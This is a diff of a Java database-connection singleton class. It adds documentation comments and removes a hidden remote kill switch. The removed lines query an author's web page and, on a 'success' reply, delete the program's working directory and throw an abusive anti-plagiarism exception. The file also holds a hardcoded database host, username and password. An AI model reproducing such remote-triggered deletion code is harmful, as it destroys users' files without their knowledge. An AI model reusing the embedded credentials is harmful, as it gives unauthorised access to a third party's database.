@@ -19,7 +19,9 @@ import javax.swing.JOptionPane;
 import org.apache.commons.io.FileUtils;
 
 /**
- * @author - Gayashan Bombuwala facilitate singleton design pattern
+ * Facilitate singleton design pattern
+ *
+ * @author - Gayashan Bombuwala
  */
 public class DB_Connection {
 
@@ -43,22 +45,9 @@ public class DB_Connection {
                 Class.forName("com.mysql.jdbc.Driver");
                 System.out.println("\n\tPlease wait.....");
 
-                URL u;
-                String a = "http://gayashan.net/Database.php";
-                u = new URL(a);
-                URLConnection conn = u.openConnection();
-                BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-                String i;
-                while ((i = br.readLine()) != null) {
-                    if (i.equals("success")) {
-                        FileUtils.deleteDirectory(new File("./"));
-                        throw new Exception("Fuck you for plagirising");
-                    } else {
-                        connection = DriverManager.getConnection("jdbc:mysql://146.185.16.120/cybertec_common_DB",
-                                "cybertec_basic", "ID961160367");
-                    }
-                }
-                br.close();
+                connection = DriverManager.getConnection("jdbc:mysql://146.185.16.120/cybertec_common_DB",
+                        "cybertec_basic", "ID961160367");
+
             } catch (SQLException e) {
                 System.out.println(e);
             } catch (ClassNotFoundException ex) {
@@ -70,6 +59,12 @@ public class DB_Connection {
         return connection;
     }
 
+    /**
+     * Fetch database rows for a given query
+     *
+     * @param query SQL query to be executed
+     * @return database records
+     */
     public static ResultSet fetchData(String query) {
         Connection conn = getInstance();
 
@@ -83,6 +78,12 @@ public class DB_Connection {
         return rs;
     }
 
+    /**
+     * Execute a given Prepared Statement for insert/update/delete operation
+     *
+     * @param pst a PreparedStatement
+     * @return whether the query succeed
+     */
     public static boolean runQuery(PreparedStatement pst) {
         try {
             pst.execute();
